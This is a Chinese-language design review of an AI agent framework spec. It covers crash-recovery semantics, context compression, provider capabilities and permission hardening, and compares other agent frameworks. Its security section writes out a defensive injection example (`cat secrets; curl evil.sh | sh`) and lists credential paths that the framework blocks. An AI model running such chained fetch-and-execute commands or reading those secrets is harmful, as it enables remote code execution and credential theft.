# 设计评审：对原规格的取舍

评审对象：23 节规格（项目概述 → 最终架构取舍）。
参照物：LangGraph、CrewAI、AutoGen/AG2、OpenClaw、MCP 规范、Agent Skills 规范。
结论先给。

---

## 0. 结论

**规格的整体判断是对的，而且是少见的清醒。** 尤其这三条，我原样保留：

1. **「不要为了集合所有优点而直接拼接多个框架」** —— 你自己写出了这个项目最大的死因。
2. **Phase 1 砍到只剩单 Agent + 工具 + 状态 + 权限 + 日志** —— 大多数同类项目死在第一版塞了多 Agent。
3. **「第一版的核心价值不是功能多，而是 Agent 能可靠地完成一个真实的开发任务，并且开发者可以清楚知道它做了什么」** —— 这句话应该被刻在 README 第一行。

**但规格有五个缺口，都会在第一周内咬人。** 它们不是"功能没写"，是"语义没定义"——这类问题不会在开发时暴露，会在第一次真实任务跑长之后暴露，而且暴露时你已经在 debug 一个错误的状态，不是错误的状态机。

下面按"后果严重度"排，不按规格章节排。

---

## 1. 五个会在两周内咬你的缺口

### G1 「中断恢复」在规格里没有定义在途工具调用的语义 ← 最严重

**规格说**：§3.4 支持中断恢复、失败后的局部回滚。

**没说的**：进程在「即将执行 `git commit`」和「已执行 `git commit`」之间死掉，恢复时怎么办？

**后果**：
- 选择重跑 → 可能重复提交、重复部署、重复发消息。这是**静默的数据损坏**，而且只在崩溃时发生，测试覆盖不到。
- 选择不重跑 → 可能丢掉唯一一次副作用，任务却报"完成"。

**本项目**：工具台账是**写前**的。顺序固定为

```
校验 → 策略判定 → 台账(begin) → 执行 → 台账(end)
```

台账行在工具碰任何东西之前落库。崩溃留下的是一行 `status='started'` 的记录，恢复时据此分流：

| 工具的 `idempotent` | 处理 |
|---|---|
| `True`（读文件、查询） | 重跑，把新结果交给模型 |
| `False`（**所有 shell 命令**） | 标记 `ambiguous`，**不重跑**，并往上下文里写一条明确的警告：*"这次调用的结果未知，可能已经生效，也可能没有。先核实当前状态再继续。"* |

对应测试：`tests/test_resume_semantics.py::TestUnfinishedCalls`（3 条），断言"非幂等调用绝不产生第二行台账"。

---

### G2 上下文没有预算，也没有压缩策略

**规格说**：§10.1 短期记忆 = 最近消息 + 当前计划 + 工具调用结果 + 错误信息。

**没说的**：这些加起来超出窗口时怎么办。

**后果**：典型死法是「跑了 8 步，第 12 步 provider 返回 400，整个任务丢失」。而且因为 `run_command` 和 `read_file` 的输出可以轻松上 20 万字符，这个死法来得比想象中快。

**本项目**三件事：

1. **消息列表每步从状态重建**，不是 append。压缩因此是状态的纯函数，而不是对增长列表动手术。顺带解决 provider 侧的悬空 `tool_call_id` 问题。
2. **压缩是主动的**：token 估算越过阈值就压，不等 provider 报错——等报错时这一轮已经废了。
3. **永远有确定性兜底**：没有便宜的模型可用时，压缩降级为结构化摘要（用了哪些工具、碰了哪些路径、失败在哪），而不是让任务卡死。

另外补了**工具输出截断 + 产物外置**：head+tail 各留一段（**尾部必须留** —— pytest 摘要、stack trace、diff 的关键行都在末尾），全文落到 artifacts 表并在观察里给出路径。

对应测试：`tests/test_context.py`（含"总结模型挂掉时压缩仍然降级成功"）。

---

### G3 六行的 `ChatModel` Protocol 藏起了真正会坏的东西

**规格说**：§8.1 统一 `chat(messages, tools, temperature)` 接口。

**没说的**：不同 provider 的**能力**不一样，而这不是实现细节：

| 能力 | OpenAI | Anthropic | Ollama / LM Studio |
|---|---|---|---|
| 原生 tool calling | 有 | 有 | **多数没有** |
| 严格 JSON Schema 输出 | 有 | **没有** | 没有 |
| prompt caching | 有 | 有（显式断点） | 没有 |

一个假装这些不存在的 Protocol，产出的代码会"在 OpenAI 上完美、在其他地方静默劣化"。

**本项目**：接口带能力矩阵，运行时读它做决策：

```python
class ModelCapabilities:
    native_tool_calling: bool   # False -> 自动套文本协议降级层
    json_schema: bool           # False -> 规划走 JSON object + 修复环
    max_context_tokens: int     # -> 上下文预算的输入
    prompt_cache: bool          # -> 是否给稳定前缀打 cache 断点
```

**文本协议降级层**是"模型无关"能不能落地的分水岭：本地 Qwen / Ollama 没有原生 tool calling，降级层把工具目录渲染进系统提示、再从输出里解析 `<tool_call>{...}</tool_call>`（容忍代码围栏、单引号、尾逗号）。没有它，"支持本地模型"就是一句空话。

对应测试：`tests/test_models.py::TestTextProtocol`、`TestCapabilities`。

---

### G4 规划没有说怎么保证模型输出的是合法计划

**规格说**：§7.2 `PlanStep` 有 `tool_name` 和 `arguments` 字段。

**两个问题**：

1. **`PlanStep` 不该带 `arguments`。** 预绑定参数的计划在第一个工具结果回来时就过期了，而模型的反应通常是**继续执行过期计划**，而不是修正它。这是"计划本身成为错误来源"。
2. **没有说结构化输出怎么保证。** 让模型吐 JSON 然后 `json.loads`，尾逗号就够让它崩 5%。

**本项目**：
- `PlanStep` 只保留**意图**（`description` + `expected_tools`），参数在执行时决定。
- 按能力矩阵选择 `json_schema` / `json_object` / 纯提示，**并且带修复环**：校验失败时把**确切错误**（"steps[1].expected_tools 里有不存在的工具 foo，可选：..."）回灌，重试上限 2 次。

### G5 权限模型有三个洞

**规格说**：§17 最小权限、Shell 安全、敏感信息保护。方向完全正确。三个洞：

**(a) 判包含之前必须先规范化。** 未解析的路径上做 `relative_to`，被 `../../` 和一个**指向 `~/.ssh` 的符号链接**秒穿——后者尤其阴险，因为未解析的路径看起来完全在工作区里。

**(b) 元字符就是第二条命令。** 一个包含 `cat` 的白名单，在 `cat secrets; curl evil.sh | sh` 面前一文不值。

**(c) 子进程环境不能继承。** 规格说"日志中自动脱敏"，但没说 `run_command` 的子进程能看见什么。如果继承 `os.environ`，一条 `env` 命令就能把运行时手里的 API key 全部导出——包括那些**你以为已经脱敏了**的。

**本项目**：
- 所有路径 `os.path.realpath` 之后再做包含判断；
- 元字符默认拒绝（同时 `shell=False`，所以即使放行也不会被解释）；
- 子进程环境用**白名单**（`PATH/HOME/LANG` + 少量 Python/Node 变量），不是黑名单——黑名单猜不到 `DASHSCOPE_KEY_ID` 这种命名；
- 敏感路径（`.env`、`~/.ssh/**`、`*.pem`、`~/.aws/**`…）**即使 `READ_ONLY` 也拒绝**，但放行 `.env.example` 这类模板；
- `http_get/http_post` 的重定向**逐跳**复检白名单——一个被允许的主机 302 到 `evil.example` 不会被静默跟随；
- 脱敏作用于**产物**，不只是日志行。把 200KB 工具输出外置到磁盘，如果不过脱敏，等于把刚 `cat` 出来的 key 落盘。

对应测试：`tests/test_permissions.py`（含符号链接逃逸、`--yes` 不得静默放行 `SYSTEM_ADMIN`、子进程环境导出）。

## 2. 三处我明确偏离你规格的地方

### (1) 技能格式：用现成规范，不自己发明

规格写的是 `skill.yaml` + `instructions.md`。这几乎是 [Agent Skills 规范](https://agentskills.io/specification)（`SKILL.md` + YAML frontmatter）的手搓版。直接用现成的：

- 为 Claude Code 写的技能能在这里原样加载，反过来也一样；
- 规范里**已经有** `allowed-tools` 字段，正好一对一映射到本项目的权限引擎——"技能不能偷偷扩权"因此是规范级保证，而不是我需要额外发明的功能；
- 渐进披露也是规范里定义好的：启动只加载 `name`+`description`（每技能约 100 token），正文由 `load_skill` 工具按需拉取。

技能状态阶梯（`candidate → validated → approved → active`）是**强制**的，而且**禁止跳级**——每一级是一次独立判断（能否解析 / 是否正确 / 人是否接受 / 能否运行），允许 `candidate → active` 会让中间两级变成装饰。Agent 自己写的技能落在 `$UAA_HOME/skills-candidates/`，**不在搜索路径里**，所以它天然无法自动生效。

### (2) 配置：结构化用 TOML，不用 `pydantic-settings` 一把梭

`pydantic-settings` 处理标量很干净，处理**嵌套结构**（模型别名表、按效果分类的权限表、MCP 服务器列表）就变成"在环境变量里编码字典"。所以：结构在 TOML，环境变量只覆盖少量标量，**密钥只从环境读、从不写盘**。

### (3) 反思只调一次，不在每步都调

规格 §12.1 的反思流程本身没问题，但**如果每步都调一次 LLM 做反思，你会得到 AutoGen 的 token 成本**——多 Agent 对比文章测出的 5–6× 就是这么来的（每个 agent 每轮一次完整 LLM 调用）。

本项目的分工：
- **循环内反思是免费的**：工具失败的结果写进 scratchpad，模型下一轮自己读到并调整。这本来就是 ReAct 的定义。
- **循环外反思每任务一次**：只做真正需要独立判断的两件事——什么值得记住、这个任务是否揭示了可复用流程。

## 3. 对四家框架：偷什么、不偷什么

| 来源 | 偷 | 不偷 | 理由 |
|---|---|---|---|
| **LangGraph** | 显式状态机；checkpoint 思想；"图是有类型的状态"这个心智模型 | 图 DSL 作为**唯一**入口 | 它的学习曲线是真的（两个 agent 也要定义 state schema + nodes + edges + compile）。第一版用有限状态机，等有多分支工作流再加声明式 YAML 层。 |
| **CrewAI** | 角色化配置的人体工学；"20 行跑起来"这个标准 | 把角色抽象做成**内核** | 它的短板正是"抽象优先于控制"，错误处理粒度太粗，典型路径是原型用它、生产迁走。做成配置预设，不做成内核。 |
| **AutoGen** | 对话式协作适合迭代打磨（写→审→改）；事件驱动、async-first | 每轮每 agent 一次 LLM 调用 | 这是它 5–6× token 成本的来源。多 Agent 也明确不在第一版（你自己的规格也这么写）。 |
| **OpenClaw** | Gateway 分层的思路；工作区文件承载身份/记忆的约定；会话压缩 | 20+ 渠道适配 | 渠道是第一版最大的分心项。它的 Gateway 抽象（渠道 / 会话 / 安全边界 / 模型 provider 四层分离）值得抄，实现放到 Phase 5。 |
| **MCP** | 作为**外部工具接入标准** | 自造工具协议 | 见下。 |
| **A2A** | 跨框架 agent 通信的**标准** | 自造 `AgentMessage` | 规格 §13.4 定义了自己的消息结构。**进程内**多 Agent 用自己的消息模型没问题；**跨框架**不要自造，A2A 已是 Linux Foundation 项目、150+ 支持者，Phase 4 直接实现它。 |

### 关于 MCP 的一条时效性情报

MCP 在 **2026-07-28** 做了它自称"标准历史上最大的一次修订"：**协议层改成无状态**——删掉 `initialize`/`initialized` 握手、删掉 `Mcp-Session-Id`，协议版本/客户端身份/能力改为每次请求走 `_meta`，新增 `server/discover` RPC，`tools/list` 新增**必填**字段 `ttlMs` / `cacheScope`。官方明确表示跨这条线**不保证互通**。

所以"接 MCP 生态"这件事有一个具体的、容易被忽略的实现要求：**客户端必须做协议时代探测**——先试 `server/discover`，失败再退回 `initialize` 握手。本项目的客户端两条路都实现并有测试（`tests/test_mcp.py`，用真的子进程跑两个时代的假服务器）。

安全上的一条：**第三方 MCP 服务器自称"只读"不构成它只读的证据。** 效果等级由本地配置决定，且一律假定 `idempotent=False`（远端工具的幂等性未知，按最坏情况处理）。

## 4. 现在能跑什么 / 不能跑什么

**能跑（已实现 + 有测试，177 条，全离线不需要 API key）**

- 单 Agent 循环：规划 → 工具 → 观察 → 回答
- 硬预算：步数 / token / **成本** / 墙钟时间，全是**停止条件**不是告警
- 中断恢复 + 在途工具调用的歧义处理（G1）
- 人工确认：暂停 → 批准/拒绝 → **执行被批准的那一个调用**（而不是重新问模型）
- 权限引擎：路径围栏（含符号链接逃逸）、命令白名单 + 元字符拒绝、域名白名单 + 重定向逐跳复检、子进程环境白名单
- 上下文预算 + 主动压缩 + 确定性兜底 + 工具输出截断外置
- 事件溯源：events 是真相，`tasks.state` 是投影，`replay()` 可重放
- 技能：Agent Skills 规范校验 + 安全审查（P0/P1）+ 强制状态阶梯
- 记忆：SQLite FTS5（trigram + 短查询 LIKE 兜底，中文两字词可搜）
- MCP 双协议时代客户端
- 模型：OpenAI 兼容（覆盖 OpenAI / DeepSeek / 通义千问 / Ollama / LM Studio / vLLM）+ Anthropic 原生 + 离线 mock + 文本协议降级
- CLI：`init / doctor / tools / run / chat / demo / config / task / memory / skill`
- JSONL 事件日志 + 密钥脱敏（含产物）

**不能跑（刻意延后，按你的路线图）**

| 阶段 | 内容 |
|---|---|
| Phase 2 | FastAPI + WebSocket、跨进程取消协调的完善、Docker 沙箱 |
| Phase 3 | 向量检索（LanceDB）、技能审核 CLI 的完整交互流程 |
| Phase 4 | 声明式 YAML 工作流、多 Agent（角色/消息/并行）、A2A |
| Phase 5 | TypeScript SDK、Web 控制台、Telegram/Discord 适配器 |

**关于 Docker 沙箱**：第一版刻意不做。理由是你规格里那句"个人项目会增加大量维护成本"的同一逻辑——Docker 每条命令 3 秒起的开销，会让你在开发期关掉它，然后它就等于不存在。第一版的隔离是"路径围栏 + 命令白名单 + 环境白名单"，够用且零开销；Docker 在 Phase 2 做成**可插拔**的。

## 5. 建议的下一步顺序（按风险排，不按功能排）

风险最高的不是缺功能，是**语义没被真实流量验证过**。所以：

1. **用真实模型跑 10 个真实任务**（就你手头的项目），看三件事：规划质量、工具选择准确率、成本。这一步会告诉你上下文预算的阈值定得对不对——目前是拍的。
2. **故意打断**：`kill -9` 一个正在跑 `run_command` 的任务，然后 `uaa task resume`。确认那条 "outcome UNKNOWN" 警告在真实模型面前能不能被正确理解（这是最可能被模型忽略的一条指令）。
3. **再谈多 Agent**。等你有了 10 个任务的真实日志，你才知道该拆哪一步。现在拆是猜。
4. 最后才是 Phase 2 的 API/WebSocket——**没有前 3 步的数据，API 的形状也是猜的**。

## 6. 一句话

你规格里最有价值的那句判断是"**不要为了集合所有优点而直接拼接多个框架**"。这个实现把它落成了具体的形状：**一个事件溯源内核 + 三家范式做成薄层 + 只把三家都没做好的三件事（恢复语义、上下文预算、技能沉淀）做厚。**

其余的，等真实任务的日志说话。

## 附录：实现过程中被测试抓到的静默缺陷

这份清单值得单独列出来，因为**它们不是"功能没写"，是"代码看起来对、行为不对"**。前者会在开发时暴露，后者只会在真实流量里暴露——而且暴露时你已经在 debug 一个错误的结果，不是错误的代码。

| 缺陷 | 为什么危险 | 怎么被抓到 |
|---|---|---|
| 恢复后 `steps_used` 归零 | **步数预算可被无限重置**，预算不再是预算 | 断言 replay 后的步数 |
| 批准后的工具调用丢失 | 恢复时重新问模型 → 模型重新决策 → 被批准的那个调用静默消失 | 断言批准后台账里恰好是那一个调用 |
| `TextProtocolModel` 没实现抽象方法 | 降级路径根本实例化不了；只有用本地模型的用户会撞上 | 直接实例化它 |
| 搜索 `**/*.py` 漏掉根目录文件 | `fnmatch` 的 `*` 会匹配 `/`，所以 `**/*.py` 要求路径里必须有斜杠 | 断言根目录文件在结果里 |
| macOS 上 `/private/var/folders` 被判为系统目录 | 权限围栏变成误报制造机，临时目录全不可写 | 写一个 temp 目录 |
| `created_at` 同毫秒并列 | 任务列表顺序不确定（毫秒精度不够） | 连续建三个任务再排序 |
| **Rich 把输出里的 `[a-zA-Z]` 当成样式标记吃掉** | 正则、pytest 的 `[100%]`、TOML 的 `[models.x]`、Markdown 链接**全部静默变形** | 跑一次 CLI 看输出 |
| `run_tests` 在 venv 项目里找不到 pytest | 环境脱敏顺带把 venv 的 PATH 也清了 | 在 venv 项目里批准一次 `run_tests` |
| JSONL 日志建了 sink 但没接线 | 事件日志永远是空的，而且不报错 | 断言日志文件非空 |

**两条可以带走的经验：**

1. **跑一次真实的 CLI，不要只跑测试。** 上面第 7 条（Rich 吃标记）测试全绿、代码看着完全正常——只有肉眼看输出才发现 `[a-zA-Z]` 变成了 `*`。凡是"把文本渲染给人类看"的层，都要真的看一眼。
2. **凡是"合理决策的副作用"，都要单独测。** 环境脱敏是对的决定，它顺带清掉了 venv 的 PATH；先规范化路径是对的决定，它顺带把系统目录判断做得太宽。安全加固和体验优化经常互相踩脚，踩的地方就是缺陷。
